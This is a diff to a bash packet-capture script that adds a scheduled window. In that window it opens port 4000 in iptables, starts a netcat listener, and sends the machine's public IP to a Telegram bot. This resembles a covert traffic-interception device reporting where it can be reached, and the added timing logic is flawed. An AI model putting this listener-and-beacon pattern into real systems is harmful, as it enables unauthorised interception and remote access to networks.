@@ -49,6 +49,27 @@ if [ $? -eq 0 ]; then
 	echo "Start intercepting..."
 	while true
 	do
+		h=$(date +"%H:%M")
+		#Schedule of 30 minutes
+		port=4000
+		start="14:00"
+		stop="14:30"
+		if [ "$h" == $start ]; then
+			echo "Enabling portforwarding on port $port..."
+			iptables -A INPUT -p tcp --dport $port -j ACCEPT
+			echo "Start listening..."
+			nc -l -p $port
+			#send notify 
+			curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Start listening: $public_ip":"$port"
+			while [ "$h" != $stop ];
+			do
+				h=$(date +"%H:%M")
+			done
+		else
+			h=$(date +"%H:%M")
+			echo "Not listening..."
+		fi
+
 		# Max size of file .pcap
 		MAX_FILE_SIZE=200000000  # 200MB in byte
 		# Name of file 
@@ -79,3 +100,4 @@ if [ $? -eq 0 ]; then
 else
   	echo "Internet not ok"
 fi
+
